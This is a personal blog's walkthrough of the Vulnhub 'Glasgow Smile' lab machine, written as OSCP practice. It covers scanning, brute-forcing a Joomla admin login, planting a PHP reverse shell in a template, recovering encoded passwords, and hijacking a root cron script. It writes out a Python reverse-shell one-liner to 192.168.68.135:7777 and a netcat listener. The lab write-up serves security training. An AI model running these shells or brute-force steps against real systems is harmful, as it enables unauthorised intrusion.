<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-language content="en">
<meta name=color-scheme content="light dark">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
<meta name=author content="Kiel Vaughn">
<meta name=description content="In order to start preparing for my eventual goal of completing the OSCP, I have started to do my best to break into various boxes found on the Vulnhub website.
The first box I selected was named Glasgow Smile, which is labeled as an OSCP style box with several flags of varying challenge levels from easy to intermediate.
Reconnaissance & Scanning    After importing into VMware Workstation and booting up the machine, you are presented with the following screen, which will provide you with the IP address of this host.">
<meta name=keywords content="blog,cybersecurity,personal">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Glasgow Smile - Vulnhub Boot2Root">
<meta name=twitter:description content="In order to start preparing for my eventual goal of completing the OSCP, I have started to do my best to break into various boxes found on the Vulnhub website.
The first box I selected was named Glasgow Smile, which is labeled as an OSCP style box with several flags of varying challenge levels from easy to intermediate.
Reconnaissance & Scanning    After importing into VMware Workstation and booting up the machine, you are presented with the following screen, which will provide you with the IP address of this host.">
<meta property="og:title" content="Glasgow Smile - Vulnhub Boot2Root">
<meta property="og:description" content="In order to start preparing for my eventual goal of completing the OSCP, I have started to do my best to break into various boxes found on the Vulnhub website.
The first box I selected was named Glasgow Smile, which is labeled as an OSCP style box with several flags of varying challenge levels from easy to intermediate.
Reconnaissance & Scanning    After importing into VMware Workstation and booting up the machine, you are presented with the following screen, which will provide you with the IP address of this host.">
<meta property="og:type" content="article">
<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/"><meta property="article:section" content="ctfs">
<meta property="article:published_time" content="2020-06-25T00:00:00+00:00">
<meta property="article:modified_time" content="2020-06-25T00:00:00+00:00">
<title>
Glasgow Smile - Vulnhub Boot2Root · Kiel Vaughn, CISSP
</title>
<link rel=canonical href=http://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/>
<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
<link rel=apple-touch-icon href=/assets/img/cissp.ico>
<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
<meta name=generator content="Hugo 0.89.4">
</head>
<body class="preload-transitions colorscheme-dark">
<main class=wrapper>
<nav class=navigation>
<section class=container>
<a class=navigation-title href=/>
Kiel Vaughn, CISSP
</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle>
<i class="fa fa-bars fa-fw" aria-hidden=true></i>
</label>
<ul class=navigation-list>
<li class=navigation-item>
<a class=navigation-link href=/whoami/>whoami</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/certifications/>certifications</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/posts/>blog</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
</li>
</ul>
</section>
</nav>
<div class=content>
<section class="container post">
<article>
<header>
<div class=post-title>
<h1 class=title>
<a class=title-link href=http://www.kielvaughn.com/ctfs/2020-06-25-glasgow-smile-walkthrough/>
Glasgow Smile - Vulnhub Boot2Root
</a>
</h1>
</div>
<div class=post-meta>
<div class=date>
<span class=posted-on>
<i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-06-25T00:00:00Z>
June 25, 2020
</time>
</span>
<span class=reading-time>
<i class="fa fa-clock-o" aria-hidden=true></i>
7-minute read
</span>
</div>
<div class=tags>
<i class="fa fa-tag" aria-hidden=true></i>
<span class=tag>
<a href=/tags/vulnhub/>vulnhub</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/glasgow-smile/>Glasgow Smile</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/boot2root/>Boot2Root</a>
</span></div>
</div>
</header>
<div>
<p>In order to start preparing for my eventual goal of completing the OSCP, I have started to do my best to break into various boxes found on the <a href=https://www.vulnhub.com>Vulnhub</a> website.</p>
<p>The first box I selected was named Glasgow Smile, which is labeled as an OSCP style box with several flags of varying challenge levels from easy to intermediate.</p>
<h2 id=reconnaissance--scanning>
Reconnaissance & Scanning
<a class=heading-link href=#reconnaissance--scanning>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<p>After importing into VMware Workstation and booting up the machine, you are presented with the following screen, which will provide you with the IP address of this host.</p>
<p><img src=/assets/img/Glasgow1.png alt="Glasgow Smile Login"></p>
<p>This can also be achieved another way, with netdiscover as shown below:</p>
<p><img src=/assets/img/Glasgow2.png alt="Glasgow Smile netdiscover"></p>
<p>Now that we have located the IP address of our target, we can proceed with performing an <strong>nmap</strong> scan to search for open ports, protocols and their versions.</p>
<p>nmap will show you that there is both SSH and Apache running which is hosting a website.</p>
<p><img src=/assets/img/Glasgow3.png alt="Glasgow Smile nmap"></p>
<p>Visiting the website presents you with a page featuring the Joker, but nothing else is immediately visible/accessible from this page.</p>
<p><img src=/assets/img/Glasgow4.png alt="Glasgow Smile Main Page"></p>
<p>At this point, you can use one of several tools to enumerate the website. I selected <strong>dirb</strong> which resulted in uncovering that Joomla is installed.</p>
<p><img src=/assets/img/Glasgow5.png alt="Glasgow Smile dirb"></p>
<p>Navigation to this directory presents a page with portions of the dialogue from the movie, &ldquo;Joker&rdquo;.</p>
<p><img src=/assets/img/Glasgow6.png alt="Glasgow Smile joomla"></p>
<p>At this point, I ran <strong>joomscan</strong> to see if it could uncover anything interesting that could be exploited. Unfortunately, there wasn&rsquo;t anything uncovered that was exploitable.</p>
<p><img src=/assets/img/Glasgow7.png alt="Glasgow Smile joomscan"></p>
<p>However, we now knew the location of the administrator login page. Next, I turned my attention back to the main Joomla page to run <strong>cewl</strong> to parse the main Joomla page for words 6 characters or longer. This was so these could be used as potential credentials for logging into the admin portal.</p>
<p><img src=/assets/img/Glasgow8.png alt="Glasgow Smile cewl"></p>
<p>Next, I launched <strong>Burp Suite</strong> and navigated to the admin login page and put in fake credentials so we could capture the request/response. I was able to capture the format of the request.</p>
<p><img src=/assets/img/Glasgow9.png alt="Glasgow Smile Burp"></p>
<p>Next, I sent this to <strong>Intruder</strong> for attempts at cracking the login credentials. Once in <strong>Intruder</strong>, I cleared all of the payload positions and selected only the passwd field.</p>
<p><img src=/assets/img/Glasgow10.png alt="Glasgow Smile Burp Intuder"></p>
<p>I then clicked on the <strong>Payloads</strong> tab and imported the word list from cewl.</p>
<p><img src=/assets/img/Glasgow11.png alt="Glasgow Smile Burp Payload"></p>
<p>Once imported, I started the attack. It did not produce any results with admin or administrator as the username, but when it was changed to joomla, we were able to uncover a set of login credentials. This was done by sorting the response file by length and looking for the one that was a different size than the rest.</p>
<p><img src=/assets/img/Glasgow12.png alt="Glasgow Smile Burp Attack"></p>
<p>We were able to recover user credentials of:</p>
<p><strong>Username:</strong> joomla and <strong>Password:</strong> Gotham</p>
<p>These credentials were then used to login to the admin page, where we discovered these were Super Administrator credentials.</p>
<p><img src=/assets/img/Glasgow13.png alt="Glasgow Smile Joomla Admin"></p>
<h2 id=exploitation-and-privilege-escalation>
Exploitation and Privilege Escalation
<a class=heading-link href=#exploitation-and-privilege-escalation>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<p>The next step at this point is to get a reverse shell back to our attacker computer. Clicking on Templates on the left hand side shows you all the templates installed and which one is currently in use. The template that is used for the entire site is <strong>protostar</strong>.</p>
<p><img src=/assets/img/Glasgow14.png alt="Glasgow Smile Joomla Template"></p>
<p>Clicking on Templates on the left hand menu followed by Protostar Details and Files will show you all the files currently used for this theme.</p>
<p><img src=/assets/img/Glasgow15.png alt="Glasgow Smile Joomla Template Files"></p>
<p>From here, I clicked on index.php, and deleted all the info in the file. Then I pasted in the PHP Reverse Shell from <a href=http://pentestmonkey.net/tools/web-shells/php-reverse-shell>PenTestMonkey</a> and modified it to point to the appropriate IP address and port on my attacker computer. Once modified, I clicked on Save.</p>
<p><img src=/assets/img/Glasgow16.png alt="Glasgow Smile Rev Shell"></p>
<p>Back on the attacker PC, I created a <strong>netcat</strong> listener on the port specified in the PHP Reverse Shell.</p>
<p><img src=/assets/img/Glasgow17.png alt="Glasgow Smile netcat listener"></p>
<p>I then navigated to the shell.php file just created located at http://192.168.68.136/joomla which launches the reverse shell back on the attacking computer.</p>
<p><img src=/assets/img/Glasgow18.png alt="Glasgow Smile connection established"></p>
<p>This is a non-interactive shell, so python was used to create an interactive shell with the following command: <code>python -c 'import pty; pty.spawn("/bin/bash")'</code>. You should now have an interactive shell as user www-data. Next we will look for database credentials in the main joomla configuration file to see what other credentials can be uncovered. This is located at <strong>/var/www/joomla2/configuration.php</strong></p>
<p><img src=/assets/img/Glasgow19.png alt="Glasgow Smile joomla configuration"></p>
<p>We will now log into the database and see what information can be found.</p>
<p><img src=/assets/img/Glasgow20.png alt="Glasgow Smile database login"></p>
<p><code>show databases;</code> will list the available databases.</p>
<p><img src=/assets/img/Glasgow21.png alt="Glasgow Smile databases"></p>
<p><code>use batjoke;</code> will select the batjoke database.</p>
<p><img src=/assets/img/Glasgow22.png alt="Glasgow Smile select database"></p>
<p><code>show tables;</code> will show all the tables in the batjoke database. Two tables are present, equipment and taskforce.</p>
<p><img src=/assets/img/Glasgow23.png alt="Glasgow Smile show tables"></p>
<p><code>select * from equipment;</code> returns no results, but <code>select * from taskforce</code> returns a list of users.</p>
<p><img src=/assets/img/Glasgow24.png alt="Glasgow Smile show taskforce"></p>
<p>rob&rsquo;s password is base64 encoded. This can be decoded with <code>echo -n Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/|base64 -d</code>.</p>
<p>This return&rsquo;s rob&rsquo;s password: <strong>???AllIHaveAreNegativeThoughts???</strong></p>
<p><img src=/assets/img/Glasgow25.png alt="Glasgow Smile rob password"></p>
<p>From here, you can now ssh as rob to the machine and uncover the first flag <strong>user.txt</strong>.</p>
<p><img src=/assets/img/Glasgow26.png alt="Glasgow Smile rob flag"></p>
<p>In this same folder is a file named <strong>Abnerineedyourhelp</strong>. Using cat on this file shows encoded text:</p>
<p><img src=/assets/img/Glasgow27.png alt="Glasgow Smile Abnerineedyourhelp"></p>
<p>This text is a Caesar cipher. If you do a -1 step on it you are able to decode the message, which appears to contain another base64 encoded password.</p>
<p><img src=/assets/img/Glasgow28.png alt="Glasgow Smile Abnerineedyourhelp decoded"></p>
<p>This can be decoded with <code>echo -n STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==|base64 -d</code> from terminal.</p>
<p><img src=/assets/img/Glasgow29.png alt="Glasgow Smile abner password"></p>
<p>This returns abner&rsquo;s password of <strong>I33hope99my0death000makes44more8cents00than0my0life0</strong></p>
<p>You can now use <code>su abner</code> to switch to abner&rsquo;s user account. From here, you can navigate to his home directory <strong>/home/abner</strong> and cat the <strong>user2.txt</strong> flag.</p>
<p><img src=/assets/img/Glasgow30.png alt="Glasgow Smile abner user2"></p>
<p>There is also another file present in this directory <strong>info.txt</strong></p>
<p>This file doesn&rsquo;t really provide any info that is helpful, as it just tells you where the term Glasgow Smile comes from.</p>
<p><img src=/assets/img/Glasgow31.png alt="Glasgow Smile abner info"></p>
<p>Next, I reviewed abner&rsquo;s <strong>.bash_history</strong> file and noticed it mentioned two different file names, <strong>.dear_penguins.zip</strong> and <strong>dear_penguins</strong>.</p>
<p><img src=/assets/img/Glasgow32.png alt="Glasgow Smile abner bash history"></p>
<p>It appears that some useful info might be present in this zip file, so I did a recursive search with <code>find /var/www/ -name ".dear*" -print'</code> to find the .dear_penguins.zip file. It was located under <strong>/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip</strong>. Since this directory is owned be root, we cannot extract it here, so we copy it to abner&rsquo;s home directory.</p>
<p><img src=/assets/img/Glasgow33.png alt="Glasgow Smile abner copy dear_penguins"></p>
<p>Next, from abner&rsquo;s home directory, unzip the .dear_penguins.zip file with abner&rsquo;s password. Upon viewing the file, it appears there is a password of <strong>scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz</strong> listed in the last line of the file.</p>
<p><img src=/assets/img/Glasgow34.png alt="Glasgow Smile abner dear_penguins text"></p>
<p>However, we are not sure what the username is at this point. Fortunately, it is easily determined by navigating up a folder and listing the directory contents with ls. The only user we do not have access to at this point is penguin.</p>
<p><img src=/assets/img/Glasgow35.png alt="Glasgow Smile ls home"></p>
<p>Using <code>su penguin</code> and the text from the dear_penguins file gets us access to penguin.</p>
<p><img src=/assets/img/Glasgow36.png alt="Glasgow Smile penguin access"></p>
<p>In penguin&rsquo;s home directory is a folder named <strong>SomeoneWhoHidesBehindAMask</strong>. Navigating to that directory is where the user3.txt file is located.</p>
<p><img src=/assets/img/Glasgow37.png alt="Glasgow Smile user3"></p>
<p>In this same folder is a file named PeopleAreStartingToNotice.txt which contains the following.</p>
<p><img src=/assets/img/Glasgow38.png alt="Glasgow Smile PeopleAreStartingToNotice"></p>
<p>This note from Joker mentions needing root access to run. There is a find file that can run as root in the same directory, but this is a rabbit hole and doesn&rsquo;t seem to be used for anything. However, running ls -al shows a hidden file named <strong>.trash_old</strong>.</p>
<p><img src=/assets/img/Glasgow39.png alt="Glasgow Smile PeopleAreStartingToNotice"></p>
<p>Upon viewing this file, it appears that it is an attempt at a script, but it has a few pieces of information missing. The initial line is missing the ! before /bin/sh and it appears that the only command that is being ran is exit 0 in this file.</p>
<p><img src=/assets/img/Glasgow40.png alt="Glasgow Smile trash_old"></p>
<p>I wasn&rsquo;t sure if this was another rabbit hole, so I copied over pspy with <code>scp pspy64 penguin@192.168.68.136:/home/penguin</code> to place it in penguin&rsquo;s home folder.</p>
<p><img src=/assets/img/Glasgow41.png alt="Glasgow Smile copy pspy64"></p>
<p>I then moved back to penguin&rsquo;s home directory and made pspy64 executable and launched the program.</p>
<p><img src=/assets/img/Glasgow42.png alt="Glasgow Smile launch pspy64"></p>
<p>After a few minutes, it became apparent that the .trash_old file was not a rabbit hole, as there was a cron job running it once a minute.</p>
<p><img src=/assets/img/Glasgow43.png alt="Glasgow Smile pspy64 trash_old"></p>
<p>Now that we know this runs as root, we add the ! before /bin/sh, comment out the exit 0 command, and add in this 1 liner to create a reverse shell <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.68.135",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
<p><img src=/assets/img/Glasgow44.png alt="Glasgow Smile update trash_old"></p>
<p>In another terminal window on the attacker machine, run <code>nc -nvlp 7777</code> and within a couple of minutes you will have a root connection.</p>
<p><img src=/assets/img/Glasgow45.png alt="Glasgow Smile root"></p>
<p>Now, all that&rsquo;s left is to cat root.txt.</p>
<p><img src=/assets/img/Glasgow46.png alt="Glasgow Smile root.txt"></p>
</div>
<footer>
</footer>
</article>
</section>
</div>
<footer class=footer>
<section class=container>
©
2020 -
2021
Kiel Vaughn
</section>
</footer>
</main>
<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
</body>
</html>